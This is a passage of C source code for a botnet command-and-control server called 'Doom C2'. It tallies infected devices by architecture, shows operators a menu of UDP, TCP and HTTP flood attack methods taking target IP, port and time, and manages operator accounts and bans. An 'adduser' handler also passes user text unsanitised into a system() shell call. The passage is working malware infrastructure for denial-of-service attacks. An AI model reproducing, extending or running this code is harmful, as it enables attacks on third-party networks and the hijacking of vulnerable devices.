                    sprintf(botnet, "\x1b[0;93mDoom.armv4 [\x1b[0;36m%d\x1b[0;93m]\r\n\x1b[0;36m", armv4);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(armv5 != 0)
                {
                    sprintf(botnet, "\x1b[0;93mDoom.armv5 [\x1b[0;36m%d\x1b[0;93m]\r\n\x1b[0;36m", armv5);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(armv6 != 0)
                {
                    sprintf(botnet, "\x1b[0;93mDoom.armv6 [\x1b[0;36m%d\x1b[0;93m]\r\n\x1b[0;36m", armv6);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(armv7 != 0)
                {
                    sprintf(botnet, "\x1b[0;93mDoom.armv7 [\x1b[0;36m%d\x1b[0;93m]\r\n\x1b[0;36m", armv7);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(mips != 0)
                {
                    sprintf(botnet, "\x1b[0;93mDoom.mips [\x1b[0;36m%d\x1b[0;93m]\r\n\x1b[0;36m", mips);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(m68k != 0)
                {
                    sprintf(botnet, "\x1b[0;93mDoom.m68k [\x1b[0;36m%d\x1b[0;93m]\r\n\x1b[0;36m", m68k);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(debug != 0)
                {
                    sprintf(botnet, "\x1b[0;93mDoom.debug [\x1b[0;36m%d\x1b[0;93m]\r\n\x1b[0;36m", debug);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(sparc != 0)
                {
                    sprintf(botnet, "\x1b[0;93mDoom.sparc [\x1b[0;36m%d\x1b[0;93m]\r\n\x1b[0;36m", sparc);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(mipsel != 0)
                {
                    sprintf(botnet, "\x1b[0;93mDoom.mipsel [\x1b[0;36m%d\x1b[0;93m]\r\n\x1b[0;36m", mipsel);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(boxes != 0)
                {
                    sprintf(botnet, "\x1b[0;93mDoom.servers [\x1b[0;36m%d\x1b[0;93m]\r\n\x1b[0;36m", boxes);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(pmalinux != 0)
                {
                    sprintf(botnet, "\x1b[0;93mDoom.pma.linux [\x1b[0;36m%d\x1b[0;93m]\r\n\x1b[0;36m", pmalinux);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(pmawindows != 0)
                {
                    sprintf(botnet, "\x1b[0;93mDoom.pma.windows [\x1b[0;36m%d\x1b[0;93m]\r\n\x1b[0;36m", pmawindows);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(unknown != 0)
                {
                    sprintf(botnet, "\x1b[0;93mDoom.unknown [\x1b[0;36m%d\x1b[0;93m]\r\n\x1b[0;36m", unknown);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                sprintf(botnet, "\x1b[0;93mTotal: [\x1b[0;36m%d\x1b[0;93m]\r\n\x1b[0;36m", clientsConnected());
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                if(accounts[find_line].maxbots < clientsConnected())
                {
                    sprintf(botnet, "\x1b[0;93mAvailable Bots [\x1b[0;36m%d\x1b[0;93m]\r\n\x1b[0;36m", accounts[find_line].maxbots);
                }
                else if(accounts[find_line].maxbots > clientsConnected())
                {
                    sprintf(botnet, "\x1b[0;93mAvailable Bots [\x1b[0;36m%d\x1b[0;93m]\r\n\x1b[0;36m", clientsConnected());
                }
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            }
        }
        else if(strstr(buf, ". mute") || strstr(buf, ". MUTE"))
        {
            if(strstr(buf, ". mute on") || strstr(buf, ". MUTE ON"))
            {
                if(managements[thefd].mute == 0)
                {
                    managements[thefd].mute = 1;
                    sprintf(botnet, "\x1b[32mMute enabled!\x1b[37m\r\n");
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                else
                {
                    sprintf(botnet, "\x1b[0;36mError, Mute is already enabled...\x1b[37m\r\n");
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
            }
            else if(strstr(buf, ". mute off") || strstr(buf, ". MUTE OFF"))
            {
                if(managements[thefd].mute == 1)
                {
                    managements[thefd].mute = 0;
                    sprintf(botnet, "\x1b[32mMute disabled!\x1b[37m\r\n");
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                else
                {
                    sprintf(botnet, "\x1b[0;36mError, Mute is already disabled...\x1b[37m\r\n");
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
            }
        }
        else if(strstr(buf, ". unmute") || strstr(buf, ". UNMUTE"))
        {
            if(managements[thefd].adminstatus == 1 || managements[thefd].adminstatus == 2)
            {
                int x;
                for(x=0; x < MAXFDS; x++)
                {
                    if(managements[x].mute == 1)
                        managements[x].mute = 0;
                }
                sprintf(botnet, "\x1b[0;93m%s \x1b[32mYou've Forced Unmute on All Clients.\x1b[37m\r\n", managements[thefd].nickname);
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            }
            else
            {
                sprintf(botnet, "UNMUTE - \x1b[0;36mPermission Denied, Must be Admin to access this tool!\x1b[0;36m\r\n");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            }
        }
        else if(strstr(buf, "resolve") || strstr(buf, "RESOLVE"))
        {
            char *ip[100];
            char *token = strtok(buf, " ");
            char *url = token+sizeof(token);
            trim(url);
            resolvehttp(url, ip);
            printf("\x1b[0;93m[\x1b[0;36mResolver\x1b[0;93m] %s -> %s\n", url, ip);
            sprintf(botnet, "\x1b[0;93m[\x1b[0;36mResolver\x1b[0;93m] %s -> %s\r\n", url, ip);
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        else if(strstr(buf, "adduser") || strstr(buf, "ADDUSER"))
        {
            if(managements[thefd].adminstatus == 1 || managements[thefd].adminstatus == 2)
            {
                char *token = strtok(buf, " ");
                char *userinfo = token+sizeof(token);
                trim(userinfo);
                char *uinfo[50];
                sprintf(uinfo, "echo '%s' >> logins.txt", userinfo);
                system(uinfo);
                printf("\x1b[0;93m%s\x1b[0;36m added user[\x1b[0;93m%s\x1b[0;36m]\n", accounts[find_line].id, userinfo);
                sprintf(botnet, "\x1b[0;93m%s\x1b[0;36m added user[\x1b[0;93m%s\x1b[0;36m]\r\n", accounts[find_line].id, userinfo);
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            }
            else
            {
                sprintf(botnet, "%s\x1b[0;36mPermission Denied!\x1b[37m\r\n", "ADDUSER - ");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                
            }
        }
        else if(strstr(buf, ". kick") || strstr(buf, ". KICK"))
        {
            if(managements[thefd].adminstatus == 1 || managements[thefd].adminstatus == 2)
            {
                // ex1: . kick user=username
                // ex2: . kick id=5
                if(strstr(buf, "user=") || strstr(buf, "USER="))
                {
                    int id;
                    char user[20];
                    char *token = strtok(buf, "=");
                    snprintf(user, sizeof(user), "%s", token+strlen(token)+1);
                    trim(user);
                    for(id=0; id < MAXFDS; id++)
                    {
                        if(strstr(managements[id].nickname, user))
                        {
                            sprintf(botnet, "\n\x1b[0;36mGoodbye, kicked by \x1b[0;93m%s\x1b[0;36m...\r\n", managements[thefd].nickname);
                            if(send(id, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                            managements[id].connected = 0;
                            close(id);
                            //managesConnected -= 1;
                            sprintf(botnet, "\x1b[0;93mKicked \x1b[0;93m%s\x1b[0;36m...\r\n", user);
                            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                        }
                    }
                }
                else if(strstr(buf, "id=") || strstr(buf, "ID="))
                {
                    char *token = strtok(buf, "=");
                    int uid = atoi(token+strlen(token)+1);
                    sprintf(botnet, "\n\x1b[0;36mGoodbye, kicked by \x1b[0;93m%s\x1b[0;36m...\r\n", managements[thefd].nickname);
                    if(send(uid, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                    managements[uid].connected = 0;
                    close(uid);
                    //managesConnected -= 1;
                    sprintf(botnet, "\x1b[0;93mKicked user with ID # \x1b[0;93m%d\x1b[0;36m...\r\n", uid);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
            }
            else
            {
                sprintf(botnet, "KICK - \x1b[0;36mPermission Denied!\x1b[0;36m\r\n");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                
            }
        }
        else if(strstr(buf, ". unban") || strstr(buf, ". UNBAN"))
        {
            if(managements[thefd].adminstatus == 2) // 2 = superadmin
            {
                // ex: . unban ip=1.1.1.1
                if(strstr(buf, "ip=") || strstr(buf, "IP="))
                {
                    int kx = 0;
                    char target[16];
                    char *token = strtok(buf, "=");
                    snprintf(target, sizeof(target), "%s", token+strlen(token)+1);
                    trim(target);
                    for(kx=0; kx < MAXFDS; kx++)
                    {
                        if(!strcmp(console[kx].banned, target))
                        {
                            memset(console[kx].banned, 0, sizeof(console[kx].banned));
                            sprintf(botnet, "\x1b[32mUnbanned user with IP \x1b[0;36m%s\x1b[0;36m...\r\n", target);
                            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                        }
                    }
                }
            }
            else
            {
                sprintf(botnet, "UNBAN - \x1b[0;36mPermission Denied, Must be SuperAdmin to access this tool!\x1b[0;36m\r\n");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            }
        }
        else if(strstr(buf, ". ban") || strstr(buf, ". BAN"))
        {
            if(managements[thefd].adminstatus == 2) // 2 = superadmin
            {
                // ex1: . ban id=5
                // ex2: . ban ip=1.1.1.1
                // ex3: . ban user=tragedy
                if(strstr(buf, "user=") || strstr(buf, "USER="))
                {
                    int id;
                    int kx = 0;
                    char iusername[30];
                    char *token = strtok(buf, "=");
                    snprintf(iusername, sizeof(iusername), "%s", token+strlen(token)+1);
                    trim(iusername);
                    for(kx=0; kx < MAXFDS; kx++)
                    {
                        if(!strcmp(managements[kx].nickname, iusername))
                            id = kx;
                    }
                    kx = 0;
                    banstart1:
                    if(atoi(console[kx].banned) > 2)
                    {
                        kx++;
                        goto banstart1;
                    }
                    else
                    {
                        snprintf(console[kx].banned, sizeof(console[kx].banned), "%s", managements[id].ip);
                        sprintf(botnet, "\n\x1b[0;36mGoodbye, banned by \x1b[0;93m%s\x1b[0;36m...\r\n", managements[thefd].nickname);
                        if(send(id, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                        managements[id].connected = 0;
                        close(id);
                        sprintf(botnet, "\x1b[0;93mBanned \x1b[0;93m%s\x1b[0;36m...\r\n", iusername);
                        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                    }
                }
                else if(strstr(buf, "id=") || strstr(buf, "ID="))
                {
                    int kx = 0;
                    char *token = strtok(buf, "=");
                    int uid = atoi(token+strlen(token)+1);
                    banstart:
                    if(atoi(console[kx].banned) > 2)
                    {
                        kx++;
                        goto banstart;
                    }
                    else
                        snprintf(console[kx].banned, sizeof(console[kx].banned), "%s", managements[uid].ip);
                    sprintf(botnet, "\n\x1b[0;36mGoodbye, banned by \x1b[0;93m%s\x1b[0;36m...\r\n", managements[thefd].nickname);
                    if(send(uid, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                    managements[kx].connected = 0;
                    close(uid);
                    sprintf(botnet, "\x1b[0;93mBanned user with ID # %d\x1b[0;36m...\r\n", uid);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                else if(strstr(buf, "ip=") || strstr(buf, "IP="))
                {
                    int kx = 0;
                    char target[16];
                    char *token = strtok(buf, "=");
                    snprintf(target, sizeof(target), "%s", token+strlen(token)+1);
                    trim(target);
                    banstart2:
                    if(atoi(console[kx].banned) > 2)
                    {
                        kx++;
                        goto banstart2;
                    }
                    else
                        snprintf(console[kx].banned, sizeof(console[kx].banned), "%s", target);
                    for(kx=0; kx < MAXFDS; kx++)
                    {
                        if(!strcmp(managements[kx].ip, target))
                        {
                            sprintf(botnet, "\n\x1b[0;36mGoodbye, banned by \x1b[0;93m%s\x1b[0;36m...\r\n", managements[thefd].nickname);
                            if(send(kx, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                            managements[kx].connected = 0;
                            close(kx);
                            sprintf(botnet, "\x1b[0;93mBanned user with IP %d\x1b[0;36m...\r\n", target);
                            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                        }
                    }
                }
            }
            else
            {
                sprintf(botnet, "BAN - \x1b[0;36mPermission Denied, Must be SuperAdmin to access this tool!\x1b[0;36m\r\n");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            }
        }
        else if(strstr(buf, "online?") || strstr(buf, "ONLINE?") || strstr(buf, "Online?"))
        {
            int k;
            strcpy(botnet, "\x1b[0;93m- \x1b[0;36mOnline Users \x1b[0;93m-\x1b[0;36m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            for(k=0; k < MAXFDS; k++)
            {
                if(strlen(managements[k].nickname) > 1 && managements[k].connected == 1)
                {
                    sprintf(botnet, "\x1b[0;93mID(%d) \x1b[0;93m%s\x1b[0;36m\r\n", k, managements[k].nickname);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
            }
        }
        if(strstr(buf, "SERVER") || strstr(buf, "server")) 
        {           
            sprintf(botnet, "\x1b[0;36m╔═══════════════════════════════════╗\x1b[0;36m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1b[0;36m║\x1b[0;93m BOTS \x1b[97m- \x1b[0;36mShows Bot Count/Arch       \x1b[0;36m║\x1b[0;36m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1b[0;36m║\x1b[0;93m RESOLVE \x1b[97m- \x1b[0;36mResolve [host]          \x1b[0;36m║\x1b[0;36m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1b[0;36m║\x1b[0;93m KILLED \x1b[97m- \x1b[0;36mShows Killed Processes   \x1b[0;36m║\x1b[0;36m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1b[0;36m║\x1b[0;93m Online? \x1b[97m- \x1b[0;36mShows Online Users      \x1b[0;36m║\x1b[0;36m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1b[0;36m║\x1b[0;93m CLS \x1b[97m- \x1b[0;36mClears Screen               \x1b[0;36m║\x1b[0;36m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1b[0;36m║\x1b[0;93m Chat Mute \x1b[97m- \x1b[0;36m. MUTE ON |. MUTE OFF \x1b[0;36m║\x1b[0;36m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1b[0;36m╚═══════════════════════════════════╝\x1b[0;36m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
        }
        if(strstr(buf, "METHODS") || strstr(buf, "methods")) 
        {           
			sprintf(botnet, "\x1b[0;36m╔══════════════════════════════════════════════════╗\x1b[0;36m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
			sprintf(botnet, "\x1b[0;36m║\x1b[0;93m!* STD IP PORT TIME              \x1b[97m-\x1b[0;36m  UDP           \x1b[0;36m║\x1b[0;36m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);  
			sprintf(botnet, "\x1b[0;36m║\x1b[0;93m!* ZAP IP PORT TIME              \x1b[97m-\x1b[0;36m  UDP           \x1b[0;36m║\x1b[0;36m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);    
			sprintf(botnet, "\x1b[0;36m║\x1b[0;93m!* TCP IP PORT TIME FLAG 32 0 10 \x1b[97m-\x1b[0;36m  TCP           \x1b[0;36m║\x1b[0;36m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);  
			sprintf(botnet, "\x1b[0;36m║\x1b[0;93m!* STOMP IP PORT TIME 32 all 0 10\x1b[97m-\x1b[0;36m  MIX           \x1b[0;36m║\x1b[0;36m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);       
        	sprintf(botnet, "\x1b[0;36m║\x1b[0;93m!* SLAP IP PORT TIME 32 1250 10  \x1b[97m-\x1b[0;36m  TCP           \x1b[0;36m║\x1b[0;36m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);  
        	sprintf(botnet, "\x1b[0;36m║\x1b[0;93m!* UDP IP PORT TIME 32 1024 10   \x1b[97m-\x1b[0;36m  UDP           \x1b[0;36m║\x1b[0;36m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);  
        	sprintf(botnet, "\x1b[0;36m║\x1b[0;93m!* RAW IP PORT TIME              \x1b[97m-\x1b[0;36m  UDP           \x1b[0;36m║\x1b[0;36m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);  
        	sprintf(botnet, "\x1b[0;36m║\x1b[0;93m!* NUKE IP PORT TIME             \x1b[97m-\x1b[0;36m  UDP           \x1b[0;36m║\x1b[0;36m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);  
        	sprintf(botnet, "\x1b[0;36m║\x1b[0;93m!* VOLT IP PORT TIME             \x1b[97m-\x1b[0;36m  UDP           \x1b[0;36m║\x1b[0;36m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);  
			sprintf(botnet, "\x1b[0;36m║\x1b[0;93m!* SHOCK IP PORT TIME            \x1b[97m-\x1b[0;36m  TCP           \x1b[0;36m║\x1b[0;36m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);       
        	sprintf(botnet, "\x1b[0;36m║\x1b[0;93m!* RANDHEX IP PORT TIME          \x1b[97m-\x1b[0;36m  UDP           \x1b[0;36m║\x1b[0;36m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
        	sprintf(botnet, "\x1b[0;36m║\x1b[0;93m!* HTTP [GET/HEAD/POST] IP PORT / TIME POWER      \x1b[0;36m║\x1b[0;36m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
        	sprintf(botnet, "\x1b[0;36m║\x1b[0;93m!* HEX [GET/HEAD/POST] IP PORT / TIME POWER       \x1b[0;36m║\x1b[0;36m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);                          
        	sprintf(botnet, "\x1b[0;36m║\x1b[0;93m!* CF [GET/HEAD/POST] IP PORT / TIME POWER        \x1b[0;36m║\x1b[0;36m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
        	sprintf(botnet, "\x1b[0;36m╚══════════════════════════════════════════════════╝\x1b[0;36m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
        	sprintf(botnet, "\x1b[0;36m╔══════════════════════════╗  \r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
        	sprintf(botnet, "\x1b[0;36m║ \x1b[0;93mSuggested Method (ZAP)   \x1b[0;36m║  \r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
        	sprintf(botnet, "\x1b[0;36m╚══════════════════════════╝  \r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
        }
        if(strstr(buf, "!* STOP")) 
        {  
            sprintf(botnet, "\x1b[0;36mAttacks Killed!\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            
        }
        else if(strstr(buf, "admin") || strstr(buf, "ADMIN")) 
        {  
            if(managements[thefd].adminstatus == 1 || managements[thefd].adminstatus == 2)
            {           
                sprintf(botnet, "\x1b[0;36m╔════════════════════════════════════════════════════════════════╗\x1b[0;36m\r\n");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                sprintf(botnet, "\x1b[0;36m║\x1b[0;93m Force Unmute All \x1b[97m- \x1b[0;36m. UNMUTE                                    \x1b[0;36m║\x1b[0;36m\r\n");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                sprintf(botnet, "\x1b[0;36m║\x1b[0;93m Kick \x1b[97m- \x1b[0;36m. KICK USER=[USERNAME] | . KICK ID=[ID#]                \x1b[0;36m║\x1b[0;36m\r\n");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                sprintf(botnet, "\x1b[0;36m║\x1b[0;93m Add User \x1b[97m- \x1b[0;36mADDUSER [USER] [PASS] [TYPE(admin/common)] [PLAN]   \x1b[0;36m║\x1b[0;36m\r\n");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                sprintf(botnet, "\x1b[0;36m║\x1b[0;93m SUPER \x1b[97m- \x1b[0;36mShows Super Admin Commands                             \x1b[0;36m║\x1b[0;36m\r\n");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                sprintf(botnet, "\x1b[0;36m╚════════════════════════════════════════════════════════════════╝\x1b[0;36m\r\n");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            }
            else
            {
                sprintf(botnet, "\x1b[0;36mAdmins Only!\x1b[0;36m\r\n", "Permission Denied");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            }
        }
        else if(strstr(buf, "SUPER") || strstr(buf, "super"))
        {           
            if(managements[thefd].adminstatus ==2)
            {
                sprintf(botnet, "\x1b[0;36m╔══════════════════════════════════════════════════╗\x1b[0;36m\r\n");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
                sprintf(botnet, "\x1b[0;36m║\x1b[0;93m Connection Ban \x1b[97m- \x1b[0;36m. BAN IP=[IP]                   \x1b[0;36m║\x1b[0;36m\r\n");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
                sprintf(botnet, "\x1b[0;36m║\x1b[0;93m User Ban \x1b[97m- \x1b[0;36m. BAN USER=[USER] | . BAN ID=[ID#]    \x1b[0;36m║\x1b[0;36m\r\n");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
                sprintf(botnet, "\x1b[0;36m║\x1b[0;93m Unban \x1b[97m- \x1b[0;36m. UNBAN IP=[IP]                          \x1b[0;36m║\x1b[0;36m\r\n");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
                sprintf(botnet, "\x1b[0;36m╚══════════════════════════════════════════════════╝\x1b[0;36m\r\n");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            }
            else
            {
                sprintf(botnet, "\x1b[0;36mSuper Admins Only!\x1b[0;36m\r\n", "Permission Denied");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            }
        }
        else if(strstr(buf, "CLS") || strstr(buf, "cls") || strstr(buf, "CLEAR") || strstr(buf, "clear"))
        {
            if(send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
            if(send(thefd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
            if(send(thefd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
            if(send(thefd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
            if(send(thefd, ascii_banner_line4, strlen(ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
            if(send(thefd, ascii_banner_line5, strlen(ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
            if(send(thefd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
            if(send(thefd, ascii_banner_line7, strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
            if(send(thefd, ascii_banner_line8, strlen(ascii_banner_line8), MSG_NOSIGNAL) == -1) goto end;
            if(send(thefd, ascii_banner_line9, strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
            pthread_create(&title, NULL, &titleWriter, thefd);
            managements[thefd].connected = 1;
        }
                trim(buf);
                char *okstring[200];
                snprintf(okstring, sizeof(okstring), ""CYAN"%s"GRAY"@"CYAN"Doom\x1b[0;36m#\x1b[0;93m: \x1b[0;36m", accounts[find_line].id);
                if(send(thefd, okstring, strlen(okstring), MSG_NOSIGNAL) == -1) goto end;
                if(strlen(buf) == 0) continue;
                if(strstr(buf, "DM") || strstr(buf, "dm"))
                {
                    continue;
                }
                else
                {
                    printf("[%s Said: \"%s\"]\n",usernamez, buf);
                    broadcast(buf, thefd, usernamez, 0, MAXFDS, thefd);
                    memset(buf, 0, 2048);
                }
                FILE *logFile;
                logFile = fopen("files/report.sql", "a");
                fprintf(logFile, "[Reporting User: %s]: \"%s\"\n",accounts[find_line].id, buf);
                fclose(logFile);
        }
        if(managements[thefd].adminstatus == 1 || managements[thefd].adminstatus == 2)
        {
            broadcast(buf, thefd, usernamez, 4, MAXFDS, thefd);
            printf("\x1b[0;93mAdmin(\x1b[0;36m%s\x1b[0;93m:%s\x1b[0;93m) \x1b[0;36mLogged Out\x1b[0;36m.\n", accounts[find_line].id, management_ip);
        }
        else
        {
            broadcast(buf, thefd, usernamez, 2, MAXFDS, thefd);
            printf("\x1b[0;93m%s\x1b[0;36m:\x1b[0;93m%s \x1b[0;36mLogged Out\x1b[0;36m.\n", accounts[find_line].id, management_ip);
        }
        end:    // cleanup dead socket and client memory
                managements[thefd].connected = 0;
                memset(managements[thefd].nickname, 0, sizeof(managements[thefd].nickname));
                memset(managements[thefd].ip, 0, sizeof(managements[thefd].ip));
                memset(botnet, 0, sizeof(botnet));
                close(thefd);
                managesConnected--;
}
void *telnetListener(int port)
{
        int sockfd, newsockfd;
        struct epoll_event event;
        socklen_t clilen;
        struct sockaddr_in serv_addr, cli_addr;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) perror("ERROR opening socket");
        bzero((char *) &serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(PORT);
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
        listen(sockfd,5);
        clilen = sizeof(cli_addr);
        while (1)
        {
            newsockfd = accept(sockfd, (struct sockaddr *)&cli_addr, &clilen);
            if (newsockfd < 0) perror("ERROR on accept");
        
            struct telnetListenerArgs args;
            args.sock = newsockfd;
            args.ip = ((struct sockaddr_in *)&cli_addr)->sin_addr.s_addr;

            pthread_t thread;
            pthread_create(&thread, NULL, &telnetWorker, (void *)&args);
        }
        
}

int main (int argc, char *argv[], void *sock)
{
    
        signal(SIGPIPE, SIG_IGN); // ignore broken pipe errors sent from kernel
        int s, threads, port;
        struct epoll_event event;
        if (argc != 3)
        {
                fprintf (stderr, "Usage: %s [port] [threads] \n", argv[0]);
                exit (EXIT_FAILURE);
        }
        printf("\x1b[0;36m[\x1b[0;93mDoom C2\x1b[0;36m]\n");
        telFD = fopen("files/bots.txt", "a+");
        threads = atoi(argv[2]);
        listenFD = create_and_bind (argv[1]); // try to create a listening socket, die if we can't
        if (listenFD == -1) abort ();
        s = make_socket_non_blocking (listenFD); // try to make it nonblocking, die if we can't
        if (s == -1) abort ();
        s = listen (listenFD, SOMAXCONN); // listen with a huuuuge backlog, die if we can't
        if (s == -1)
        {
                perror ("listen");
                abort ();
        }
        epollFD = epoll_create1 (0); // make an epoll listener, die if we can't
        if (epollFD == -1)
        {
                perror ("epoll_create");
                abort ();
        }
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1)
        {
                perror ("epoll_ctl");
                abort ();
        }
        pthread_t thread[threads + 2];
        while(threads--)
        {
                pthread_create( &thread[threads + 2], NULL, &epollEventLoop, (void *) NULL); // make a thread to command each bot individually
        }
        pthread_create(&thread[0], NULL, &telnetListener, port);
        while(1)
        {
                broadcast("PING", -1, "Doom", 0, MAXFDS, 0);
                sleep(60);
        }
        close (listenFD);
        return EXIT_SUCCESS;
}